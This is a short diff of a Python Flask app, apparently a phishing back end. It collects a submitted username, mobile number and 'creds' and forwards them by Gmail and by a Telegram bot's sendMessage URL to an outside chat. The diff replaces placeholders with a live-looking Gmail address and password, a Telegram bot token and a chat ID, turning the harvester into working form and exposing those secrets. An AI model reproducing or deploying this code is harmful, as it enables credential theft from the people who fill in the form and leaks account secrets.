@@ -8,8 +8,8 @@ app = Flask(__name__)
 app.config['MAIL_SERVER'] = 'smtp.gmail.com'
 app.config['MAIL_PORT'] = 587
 app.config['MAIL_USE_TLS'] = True
-app.config['MAIL_USERNAME'] = 'your_email@gmail.com'  # Your email
-app.config['MAIL_PASSWORD'] = 'your_email_password'  # Your email password
+app.config['MAIL_USERNAME'] = 'whatsappbot832@gmail.com' # Your email
+app.config['MAIL_PASSWORD'] = 'FANTASTICS' # Your email password
 mail = Mail(app)
 
 @app.route('/')
@@ -35,8 +35,8 @@ def submit():
         print('Error sending email:', e)
 
     # Send to Telegram
-    telegram_token = 'YOUR_TELEGRAM_BOT_TOKEN'  # Replace with your bot token
-    chat_id = 'YOUR_CHAT_ID'  # Replace with your chat ID
+    telegram_token = '7667629849:AAEllJTYVvUUXnjk0sbZ5j8u2wOJson-fT8'  # Replace with your bot token
+    chat_id = '7245749861'  # Replace with your chat ID
     telegram_message = f"Username: {username}\nMobile: {mobile}\nCreds: {creds}"
     telegram_url = f"https://api.telegram.org/bot{telegram_token}/sendMessage?chat_id={chat_id}&text={telegram_message}"
 
